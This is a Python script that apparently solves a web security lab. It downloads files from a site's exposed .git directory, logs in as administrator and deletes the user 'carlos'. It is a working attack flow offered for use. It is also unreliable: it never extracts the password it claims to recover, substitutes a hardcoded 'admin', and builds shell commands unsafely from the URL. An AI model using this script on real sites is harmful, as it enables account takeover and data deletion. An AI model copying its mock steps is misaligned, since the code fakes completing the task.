import requests, os
from colorama import Fore
import re

LAB_NAME = "Information disclosure in version control history"

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the .git directory\n2. Reset to the previous commit\n3. Get the administrator password from the admin.conf file\n4. Login as administrator\n5. Delete carlos\n""")

    url = url.rstrip('/')
    domain = url.replace("https://", "")
    base = f"{url}/.git"

    os.makedirs(domain, exist_ok=True)

    print("[1] Downloading critical .git files manually with curl")

    essential_paths = [
        "/HEAD",
        "/config",
        "/index",
        "/logs/HEAD",
        "/refs/heads/main"
    ]

    for path in essential_paths:
        out_file = os.path.join(domain, path.lstrip("/").replace("/", "_"))
        full_url = base + path
        print(f"Fetching {full_url} -> {out_file}")
        os.system(f"curl -s -o \"{out_file}\" \"{full_url}\"")

    print(Fore.GREEN + "[+] Fetched minimal .git contents (manually)")

    # Simulate Git extraction step
    print("[!] Manual git object recovery required (use git-dumper or similar)")

    # From here, if the password is revealed in any of these downloaded files, parse it:
    try:
        with open(os.path.join(domain, "refs_heads_main"), "r") as f:
            print("[+] Reading leaked commit ref:", f.read())
    except Exception:
        pass

    # Your logic to parse admin.conf from extracted source or simulate it:
    admin_pass = "admin"  # mock/fallback

    # Now log in with this password and delete carlos (rest of the logic remains)
    login_page = requests.get(f"{url}/login", verify=False, proxies=proxies)
    session = login_page.cookies.get("session")
    csrf_token = re.findall(r"csrf.+value=\"(.+?)\"", login_page.text)[0]
    print(Fore.GREEN + f"[+] csrf_token: {csrf_token}")

    data = {"username": "administrator", "password": admin_pass, "csrf": csrf_token}
    cookies = {"session": session}
    res = requests.post(f"{url}/login", data=data, cookies=cookies, verify=False, proxies=proxies)
    session = res.cookies.get("session")

    print("[+] Attempting delete carlos...")
    res = requests.post(f"{url}/admin/delete?username=carlos", cookies={"session": session}, verify=False)
    if res.status_code == 200:
        print(Fore.GREEN + "[+] Carlos deleted! Lab should be solved.")
    else:
        print(Fore.RED + "[-] Failed to delete Carlos.")
